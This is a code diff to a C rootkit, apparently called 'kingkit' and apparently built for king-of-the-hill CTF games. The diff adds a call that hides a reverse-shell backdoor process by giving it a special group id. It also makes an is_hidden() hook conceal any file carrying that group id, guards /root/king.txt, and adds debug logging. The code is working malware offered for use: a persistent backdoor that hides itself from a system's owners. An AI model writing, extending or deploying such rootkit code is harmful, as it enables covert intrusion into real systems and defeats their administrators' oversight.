@@ -271,6 +271,8 @@ void revshell() {
         );
         fclose(open_socket);
 
+        setgid(HIDDEN_GID); //automatically hide the backdoor process by setting the gid to HIDDEN_GID
+
         char *argv[] = {PROCESS_NAME, NULL}; //pass command-line arguments, the first argument appears as process name
         execve(SHELL, argv, NULL); //execute the shell
 
@@ -282,6 +284,9 @@ void revshell() {
 
 
 int is_protected(char *pathname) {
+    #if DEBUG
+    printf("[kingkit] is_protected() called with pathname: %s.\n", pathname);
+    #endif
     if (strcmp(pathname, "/root/king.txt") == 0) {
         king();
         return 1;
@@ -291,6 +296,14 @@ int is_protected(char *pathname) {
 
 
 int is_hidden(char *pathname) {
+    #if DEBUG
+    printf("[kingkit] is_hidden() called with pathname: %s.\n", pathname);
+    #endif
+    original_stat = syscall_address(original_stat, "stat");
+    struct stat sb;
+    if ((*original_stat)(pathname, &sb) != -1 && sb.st_gid == HIDDEN_GID) {
+        return 1;
+    }
     return strcmp(pathname, FAKE_PRELOAD) == 0 || strcmp(pathname, LIB_PATH) == 0; //return 1 if there is a match
 }
 
